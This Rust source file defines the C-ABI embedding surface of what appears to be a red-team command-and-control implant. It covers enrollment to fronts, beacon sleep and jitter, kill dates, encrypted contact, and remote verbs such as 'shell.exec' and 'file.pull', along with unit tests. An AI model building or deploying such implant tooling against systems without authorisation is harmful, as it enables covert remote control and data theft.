//! The linkable core's C-ABI embedding surface (architecture.md Sec 15.2,
//! ADR-018): the lib target formalized so a shell in any language that can
//! link a static library writes `main` and a pump loop and gets the whole
//! wire stack -- the middle rung between a Tier 0 implant written from
//! scratch and a fork of this crate. Five symbols, named `rod_core_*` to
//! stand beside (never inside) the plugin family's `rod_plugin_*` set.
//!
//! The drive is cooperative and single-threaded: construct, then call
//! [`rod_core_pump`] from one thread -- each call performs the machine's
//! next due action (an enroll attempt, a whole contact cycle) or answers
//! how long to wait -- and read state between calls. The shell owns the
//! sleeping, the process, and the exit; the core never exits, never spawns
//! threads, and writes nothing to stdout. Diagnostics follow the crate's
//! own ROD_VERBOSE gate (stderr only).
//!
//! The profile the surface takes is the dev shape as explicit fields (the
//! same knobs the ROD_* environment carries); a fielded bake still rides
//! the Rust entries, which read it before the machine exists. The C
//! contract's mirror for embedders is `include/rod_core.h`; the worked
//! shell is `shell/main.c`.

use std::ffi::{c_char, CStr};

use crate::handlers::COMPILED_VERBS;
use crate::profile::Profile;
use crate::run::{Exit, Machine, Phase, Step};

/// The ABI version this build speaks; a shell refuses to drive a core that
/// answers another number.
pub const ABI_VERSION: u32 = 1;

// The state read's phase discriminants, mirrored in rod_core.h.
pub const PHASE_ENROLLING: u32 = 1;
pub const PHASE_CONTACTING: u32 = 2;
pub const PHASE_DONE: u32 = 3;

/// The machine's construction profile, one C string per knob. Every string
/// is read at init and copied; the caller's buffers are not held. A NULL
/// or empty optional string is the documented default.
///
/// This is the dev shape as explicit fields: `enroll_url` and
/// `deploy_token` are required, everything else has a default. An empty
/// verb list advertises everything this build compiled -- the embedding
/// default is the whole stack, where a bake narrows per build profile.
#[repr(C)]
pub struct RodCoreProfile {
    /// Set to `sizeof(rod_core_profile)`; a mismatched value refuses init.
    pub struct_size: u32,
    /// The enroll front; required (the walk's primary).
    pub enroll_url: *const c_char,
    /// The one-use deploy token; required.
    pub deploy_token: *const c_char,
    /// The run's kill date, RFC-3339; optional. The core refuses to start
    /// past it and re-checks every step.
    pub kill_date: *const c_char,
    /// Comma-separated advertised verbs; empty means the compiled set.
    pub verbs: *const c_char,
    /// The pinned TLS posture's CA, PEM; empty keeps the platform default
    /// validation (the lab/dev shape).
    pub ca_pem: *const c_char,
    /// "pinned" (default) or "public" (a real-domain front under a public
    /// CA's certificate).
    pub tls_trust: *const c_char,
    /// The baked per-artifact key (base64 of keyId(16) || key(32)); empty
    /// is the plaintext lab carriage, a usable key seals every contact.
    pub envelope_key: *const c_char,
    /// Comma-separated fallback enroll fronts; optional.
    pub fallback_urls: *const c_char,
    /// "poll" (default) or "stream".
    pub mode: *const c_char,
    /// The contact cadence, seconds; <= 0 reads the default (30).
    pub sleep_seconds: f64,
    /// The cadence's jitter half-width, seconds; < 0 reads 0.
    pub jitter_seconds: f64,
}

/// A state read: the machine's phase, its exit code once done, and the
/// wait the driving shell owes before the next pump.
#[repr(C)]
pub struct RodCoreState {
    /// Set to `sizeof(rod_state)` (the C name of this struct); a
    /// mismatched read answers an error.
    pub struct_size: u32,
    /// `ROD_CORE_ENROLLING`, `ROD_CORE_CONTACTING`, or `ROD_CORE_DONE`.
    pub phase: u32,
    /// Valid once the phase is done: the standalone process's own exit
    /// code (0 clean terminations, 1 definitive failures, 2 the init
    /// gates).
    pub exit_code: i32,
    /// Milliseconds until the next action is due; 0 means pump when ready.
    pub wait_ms: u32,
    /// Contact cycles crossed since enrollment.
    pub contacts: u64,
    /// The enrolled implant id, NUL-terminated UTF-8; empty before
    /// enrollment lands.
    pub implant_id: [u8; 64],
}

/// The handle the surface drives: the machine plus the wait its last step
/// answered. Owned by the caller between init and free; one thread only.
pub struct RodCore {
    machine: Machine,
}

impl RodCore {
    fn phase_code(&self) -> u32 {
        match self.machine.phase() {
            Phase::Enrolling => PHASE_ENROLLING,
            Phase::Contacting => PHASE_CONTACTING,
            Phase::Done(_) => PHASE_DONE,
        }
    }

    fn exit_code(&self) -> i32 {
        match self.machine.exit() {
            Some(Exit::Terminated(code)) => code as i32,
            Some(Exit::NoFront) => 1,
            None => 0,
        }
    }

    fn fill_state(&self, out: &mut RodCoreState) {
        let id = self.machine.implant_id().as_bytes();
        let held = id.len().min(out.implant_id.len() - 1);
        out.implant_id = [0u8; 64];
        out.implant_id[..held].copy_from_slice(&id[..held]);
        out.phase = self.phase_code();
        out.exit_code = self.exit_code();
        out.wait_ms = self
            .machine
            .pending_wait()
            .as_millis()
            .min(u32::MAX as u128) as u32;
        out.contacts = self.machine.contacts();
    }
}

/// The ABI version this core speaks.
#[no_mangle]
pub extern "C" fn rod_core_abi_version() -> u32 {
    ABI_VERSION
}

/// Builds a core for a profile. Answers NULL only on a malformed argument
/// (a null pointer, a wrong `struct_size`); a profile whose gates refuse
/// (no enroll front, no credential, a passed kill date) still answers a
/// handle whose phase is already done -- the shell reads the state and its
/// exit code like any other end state.
///
/// # Safety
/// `profile` must be null or point at a `rod_core_profile` this call may
/// read, and every non-null string field must point at a NUL-terminated
/// buffer this call may read. The strings are copied; nothing is retained.
#[no_mangle]
pub unsafe extern "C" fn rod_core_init_with_profile(
    profile: *const RodCoreProfile,
) -> *mut RodCore {
    if profile.is_null() {
        return std::ptr::null_mut();
    }
    let raw = unsafe { &*profile };
    if raw.struct_size != std::mem::size_of::<RodCoreProfile>() as u32 {
        return std::ptr::null_mut();
    }
    let profile = profile_from_abi(raw);
    Box::into_raw(Box::new(RodCore {
        machine: Machine::new(profile),
    }))
}

/// Performs the machine's next due action and answers the phase after the
/// step. A phase of `ROD_CORE_DONE` is final; every other phase is pumped
/// again, after the wait the state read reports (0 = due now).
///
/// # Safety
/// `core` must be a handle this thread owns -- created by init, not yet
/// freed, and never driven from two threads at once.
#[no_mangle]
pub unsafe extern "C" fn rod_core_pump(core: *mut RodCore) -> u32 {
    let core = unsafe { core.as_mut().expect("rod_core_pump: null core") };
    match core.machine.pump() {
        // The step's own answer folded into the phase: Wait is the next
        // pump's answer (the state read carries the wait), Acted and Done
        // are the phase as it now stands.
        Step::Acted | Step::Wait(_) => core.phase_code(),
        Step::Done(_) => PHASE_DONE,
    }
}

/// Reads the machine's state. Answers 0 on success, 1 on a malformed
/// argument (a null pointer, a wrong `struct_size` -- nothing is written).
///
/// # Safety
/// `core` must be a live handle and `out` must point at a `rod_state`
/// (the C name of this struct) this call may write.
#[no_mangle]
pub unsafe extern "C" fn rod_core_state(core: *const RodCore, out: *mut RodCoreState) -> u32 {
    let (Some(core), Some(out)) = (unsafe { core.as_ref() }, unsafe { out.as_mut() }) else {
        return 1;
    };
    if out.struct_size != std::mem::size_of::<RodCoreState>() as u32 {
        return 1;
    }
    core.fill_state(out);
    0
}

/// Releases a handle. The core never exits the process itself; a shell
/// that wants the machine gone before its own end calls this.
///
/// # Safety
/// `core` must be a handle init answered and nobody else may hold it.
#[no_mangle]
pub unsafe extern "C" fn rod_core_free(core: *mut RodCore) {
    if !core.is_null() {
        drop(unsafe { Box::from_raw(core) });
    }
}

/// Reads a C string as owned UTF-8, NUL-terminated buffers only; NULL is
/// the empty string. The copy is lossy -- an embedder's non-UTF-8 bytes
/// must not fail a handle the gates would admit.
fn owned(ptr: *const c_char) -> String {
    if ptr.is_null() {
        return String::new();
    }
    unsafe { CStr::from_ptr(ptr) }
        .to_string_lossy()
        .into_owned()
}

/// Builds the core's profile from the ABI struct: the dev shape's knobs
/// and defaults, field for field.
fn profile_from_abi(raw: &RodCoreProfile) -> Profile {
    let envelope_key = owned(raw.envelope_key);
    let verbs = owned(raw.verbs);
    Profile {
        enroll_url: owned(raw.enroll_url),
        fallback_enroll_urls: owned(raw.fallback_urls)
            .split(',')
            .map(str::trim)
            .filter(|url| !url.is_empty())
            .map(str::to_string)
            .collect(),
        ca_pem: owned(raw.ca_pem),
        tls_trust: match owned(raw.tls_trust).trim() {
            "" => "pinned".into(),
            trust => trust.to_string(),
        },
        kill_date: match owned(raw.kill_date).trim() {
            "" => None,
            date => Some(date.to_string()),
        },
        sleep_seconds: if raw.sleep_seconds > 0.0 {
            raw.sleep_seconds
        } else {
            30.0
        },
        jitter_seconds: raw.jitter_seconds.max(0.0),
        mode: match owned(raw.mode).trim() {
            "" => "poll".into(),
            mode => mode.to_string(),
        },
        enroll_path: "/implants/enroll".into(),
        request_timeout_seconds: 30.0,
        envelope: "none".into(),
        contact_envelope: if envelope_key.is_empty() {
            "none".into()
        } else {
            "aesgcm".into()
        },
        envelope_key,
        wg_private_key: String::new(),
        wg_server_key: String::new(),
        token: owned(raw.deploy_token),
        verbs: if verbs.is_empty() {
            COMPILED_VERBS.iter().map(|verb| verb.to_string()).collect()
        } else {
            verbs
                .split(',')
                .map(str::trim)
                .filter(|verb| !verb.is_empty())
                .map(str::to_string)
                .collect()
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn profile_struct() -> RodCoreProfile {
        RodCoreProfile {
            struct_size: std::mem::size_of::<RodCoreProfile>() as u32,
            enroll_url: c"https://front.example".as_ptr(),
            deploy_token: c"secret".as_ptr(),
            kill_date: std::ptr::null(),
            verbs: std::ptr::null(),
            ca_pem: std::ptr::null(),
            tls_trust: std::ptr::null(),
            envelope_key: std::ptr::null(),
            fallback_urls: std::ptr::null(),
            mode: std::ptr::null(),
            sleep_seconds: 0.0,
            jitter_seconds: -1.0,
        }
    }

    fn init(raw: &RodCoreProfile) -> *mut RodCore {
        unsafe { rod_core_init_with_profile(raw) }
    }

    fn state_of(core: *const RodCore) -> RodCoreState {
        let mut state = RodCoreState {
            struct_size: std::mem::size_of::<RodCoreState>() as u32,
            phase: 0,
            exit_code: -1,
            wait_ms: u32::MAX,
            contacts: 0,
            implant_id: [0xff; 64],
        };
        assert_eq!(unsafe { rod_core_state(core, &mut state) }, 0);
        state
    }

    #[test]
    fn the_abi_version_is_a_constant() {
        assert_eq!(rod_core_abi_version(), ABI_VERSION);
    }

    #[test]
    fn init_refuses_malformed_arguments_with_null() {
        assert!(unsafe { rod_core_init_with_profile(std::ptr::null()) }.is_null());
        let mut raw = profile_struct();
        raw.struct_size = 0;
        assert!(init(&raw).is_null());
    }

    #[test]
    fn state_refuses_malformed_arguments_without_writing() {
        let core = init(&profile_struct());
        assert!(!core.is_null());
        let mut state = RodCoreState {
            struct_size: 0,
            phase: 0,
            exit_code: 0,
            wait_ms: 0,
            contacts: 0,
            implant_id: [0; 64],
        };
        assert_eq!(unsafe { rod_core_state(core, &mut state) }, 1);
        // A null handle refuses the same way.
        assert_eq!(unsafe { rod_core_state(std::ptr::null(), &mut state) }, 1);
        unsafe { rod_core_free(core) };
    }

    #[test]
    fn an_empty_credential_answering_a_handle_reports_the_gate() {
        // The gates answer a handle whose phase is already done -- the
        // shell reads the state like any other end state, and the exit
        // code is the standalone's own (2: the init gates).
        let mut raw = profile_struct();
        raw.deploy_token = c"".as_ptr();
        let core = init(&raw);
        let state = state_of(core);
        assert_eq!(state.phase, PHASE_DONE);
        assert_eq!(state.exit_code, 2);
        assert_eq!(unsafe { rod_core_pump(core) }, PHASE_DONE);
        assert_eq!(state_of(core).exit_code, 2);
        unsafe { rod_core_free(core) };
    }

    #[test]
    fn a_passed_kill_date_gates_the_handle_terminal() {
        let mut raw = profile_struct();
        raw.kill_date = c"2020-01-01T00:00:00Z".as_ptr();
        let core = init(&raw);
        let state = state_of(core);
        assert_eq!(state.phase, PHASE_DONE);
        assert_eq!(state.exit_code, 2);
        unsafe { rod_core_free(core) };
    }

    #[test]
    fn a_live_profile_starts_enrolling_with_no_wait_and_no_id() {
        let core = init(&profile_struct());
        let state = state_of(core);
        assert_eq!(state.phase, PHASE_ENROLLING);
        assert_eq!(state.exit_code, 0);
        assert_eq!(state.wait_ms, 0);
        assert_eq!(state.contacts, 0);
        assert_eq!(state.implant_id[0], 0, "no id before enrollment");
        unsafe { rod_core_free(core) };
    }

    #[test]
    fn the_defaults_read_the_dev_shape_knobs() {
        let built = profile_from_abi(&profile_struct());
        assert_eq!(built.enroll_url, "https://front.example");
        assert_eq!(built.token, "secret");
        assert_eq!(built.kill_date, None);
        assert_eq!(built.tls_trust, "pinned");
        assert_eq!(built.mode, "poll");
        assert_eq!(built.sleep_seconds, 30.0);
        assert_eq!(built.jitter_seconds, 0.0);
        assert_eq!(built.contact_envelope, "none");
        // An empty verb list advertises the compiled set -- the embedding
        // default is the whole stack.
        assert_eq!(built.verbs, COMPILED_VERBS);
        assert!(built.fallback_enroll_urls.is_empty());

        let mut raw = profile_struct();
        raw.verbs = c"shell.exec, file.pull".as_ptr();
        raw.fallback_urls = c"https://two.example,".as_ptr();
        raw.mode = c"stream".as_ptr();
        raw.sleep_seconds = 1.0;
        raw.jitter_seconds = 0.5;
        raw.tls_trust = c"public".as_ptr();
        raw.envelope_key = c"key".as_ptr();
        let built = profile_from_abi(&raw);
        assert_eq!(
            built.verbs,
            vec!["shell.exec".to_string(), "file.pull".to_string()]
        );
        assert_eq!(
            built.fallback_enroll_urls,
            vec!["https://two.example".to_string()]
        );
        assert_eq!(built.mode, "stream");
        assert_eq!(built.sleep_seconds, 1.0);
        assert_eq!(built.jitter_seconds, 0.5);
        assert_eq!(built.tls_trust, "public");
        assert!(built.public_tls());
        // A usable key turns the sealed carriage on, the dev shape's rule.
        assert_eq!(built.contact_envelope, "aesgcm");
    }
}
